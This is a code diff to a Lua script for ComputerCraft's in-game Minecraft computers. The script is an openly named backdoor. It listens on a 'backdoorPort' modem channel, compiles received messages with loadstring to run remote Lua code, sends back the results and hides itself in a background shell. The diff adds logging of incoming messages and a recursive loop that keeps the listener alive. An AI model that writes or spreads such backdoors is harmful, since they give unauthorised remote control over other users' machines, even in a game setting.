@@ -103,6 +103,7 @@ modem.open(backdoorPort);
 modem.transmit(port, backdoorPort, id)
 
 function Check(event, side, channel, replyChannel, message, distance)
+    print(event, side, channel, replyChannel, message, distance)
     if channel == backdoorPort then
         modem.transmit(port, backdoorPort, pcall(function()
             return loadstring(message); -- Run lua code here!
@@ -120,5 +121,10 @@ end
 function toBackground()
     shell.run("/rom/programs/advanced/multishell")
 end
---İts working only advanced computers...--
-parallel.waitForAny(toBackground , listen)
+
+function Loop()
+    --İts working only advanced computers...--
+    parallel.waitForAny(toBackground , listen);
+    Loop();
+end
+Loop();
